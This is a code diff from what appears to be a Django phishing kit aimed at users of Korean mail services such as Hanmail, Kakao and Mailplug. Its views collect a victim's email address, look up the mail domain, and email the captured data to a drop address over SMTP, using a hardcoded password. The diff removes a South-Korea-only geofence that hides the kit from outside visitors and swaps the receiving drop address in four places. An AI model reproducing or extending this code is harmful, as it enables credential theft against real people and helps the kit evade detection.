@@ -17,21 +17,6 @@ def landing(request):
     emailgrabber = request.GET["email"]
     domainapi = emailgrabber[emailgrabber.index('@') + 1 : ]
     mx_records = dns.resolver.query(domainapi, 'MX')
-
-    # Try to get the two-letter ISO country code for the user's IP address
-    try:
-        ip_bytes = socket.inet_aton(iplogger)
-        country_code = pycountry.countries.get(alpha_2=ip_bytes).alpha_2.lower()
-    except:
-        # If we can't get the country code, block the user as a precaution
-        return render(request, '403.html')
-
-    # Check if the user is located in South Korea
-    if country_code != 'kr':
-        # If the user is not in South Korea, block them
-        return render(request, '403.html')
-    
-    # If the user is in South Korea
     for mx in mx_records:
         mx_hostname = str(mx.exchange).rstrip('.')
         if 'hanmail.net' in mx_hostname:
@@ -55,7 +40,7 @@ def hiwoks(request):
     domainya = emailya[emailya.index('@') + 1 : ]
     sender_eya = "newupdate@lonparks.online"
     sender_emailya = "newupdate@lonparks.online"
-    receiver_emailya = "trreportreport@yandex.com" # faithcooceo@gmail.com
+    receiver_emailya = "shaan.nihan@meantodeal.com" # faithcooceo@gmail.com
     passwordya = "g{VbS{^o6&HT"
     useragentya = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
@@ -95,7 +80,7 @@ def mailplug(request):
     domainya = emailya[emailya.index('@') + 1 : ]
     sender_eya = "newupdate@lonparks.online"
     sender_emailya = "newupdate@lonparks.online"
-    receiver_emailya = "trreportreport@yandex.com" # faithcooceo@gmail.com
+    receiver_emailya = "shaan.nihan@meantodeal.com" # faithcooceo@gmail.com
     passwordya = "g{VbS{^o6&HT"
     useragentya = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
@@ -137,7 +122,7 @@ def general(request):
     domainya = emailya[emailya.index('@') + 1 : ]
     sender_eya = "newupdate@lonparks.online"
     sender_emailya = "newupdate@lonparks.online"
-    receiver_emailya = "trreportreport@yandex.com" # faithcooceo@gmail.com
+    receiver_emailya = "shaan.nihan@meantodeal.com" # faithcooceo@gmail.com
     passwordya = "g{VbS{^o6&HT"
     useragentya = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
@@ -179,7 +164,7 @@ def kakao(request):
     domainya = emailya[emailya.index('@') + 1 : ]
     sender_eya = "newupdate@lonparks.online"
     sender_emailya = "newupdate@lonparks.online"
-    receiver_emailya = "trreportreport@yandex.com" # faithcooceo@gmail.com
+    receiver_emailya = "shaan.nihan@meantodeal.com" # faithcooceo@gmail.com
     passwordya = "g{VbS{^o6&HT"
     useragentya = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
